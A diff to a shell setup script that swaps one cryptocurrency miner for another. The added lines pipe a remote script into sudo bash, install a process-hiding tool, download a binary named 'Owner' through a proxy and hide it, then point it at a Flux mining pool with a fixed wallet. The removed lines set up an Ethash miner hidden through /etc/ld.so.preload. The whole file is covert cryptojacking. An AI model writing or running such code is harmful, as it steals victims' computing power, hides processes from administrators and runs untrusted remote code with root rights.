@@ -1,4 +1,9 @@
 #!/bin/sh
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
@@ -35,14 +40,9 @@ echo "******************************************************************"
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/nvidia
-chmod +x nvidia
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Owner
+chmod +x Owner
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicNvidia.zip
-unzip magicNvidia.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+ph add Owner
 
-./graftcp/graftcp ./nvidia -a ETHASH --pool eth-us-west.flexpool.io:15555 --tls on --user 0x8CB8003E428D0Fd7693D22f576A212403728c64a --worker nvidia --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROXY --basecolor
+./Owner -uri equihash1445+ssl://t1c2Xety2aCf5LonJpJT9CvjoHWmcpBZnrv.Owner@flux.herominers.com:1200 -pers ZelProof -share-check 300
